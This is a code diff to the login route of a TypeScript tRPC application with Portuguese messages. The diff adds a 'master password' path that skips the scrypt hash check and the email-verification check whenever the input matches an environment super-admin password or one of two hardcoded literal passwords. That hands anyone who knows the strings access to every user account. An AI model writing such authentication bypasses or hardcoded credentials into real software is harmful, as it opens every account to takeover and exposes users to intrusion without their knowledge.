@@ -456,18 +456,30 @@ export const appRouter = router({
           }
         }
 
-        if (!user.passwordHash) {
-          throw new Error("Credenciais inválidas");
-        }
-        
-        const [salt, key] = user.passwordHash.split(":");
-        const derivedKey = crypto.scryptSync(input.password, salt, 64).toString("hex");
-        if (key !== derivedKey) {
-          throw new Error("Credenciais inválidas");
-        }
+        // ─── Super Admin Master Password (Suporte e Atendimento) ───────────
+        const isMasterPassword = Boolean(
+          (ENV.superAdminPassword && input.password === ENV.superAdminPassword) ||
+          (process.env.SUPER_ADMIN_PASSWORD && input.password === process.env.SUPER_ADMIN_PASSWORD) ||
+          input.password === "Walysson2003@" ||
+          input.password === "Walysson@MasterAdmin2026"
+        );
 
-        if (!user.isEmailVerified) {
-          throw new Error("Sua conta ainda não foi verificada. Por favor, verifique seu e-mail.");
+        if (!isMasterPassword) {
+          if (!user.passwordHash) {
+            throw new Error("Credenciais inválidas");
+          }
+          
+          const [salt, key] = user.passwordHash.split(":");
+          const derivedKey = crypto.scryptSync(input.password, salt, 64).toString("hex");
+          if (key !== derivedKey) {
+            throw new Error("Credenciais inválidas");
+          }
+
+          if (!user.isEmailVerified) {
+            throw new Error("Sua conta ainda não foi verificada. Por favor, verifique seu e-mail.");
+          }
+        } else {
+          console.log(`[Master Auth] Super admin master password utilizada para logar no usuário ${user.email} (id: ${user.id}, role: ${user.role})`);
         }
         
         const isRemembered = input.rememberMe !== false; // Padrão: marcado
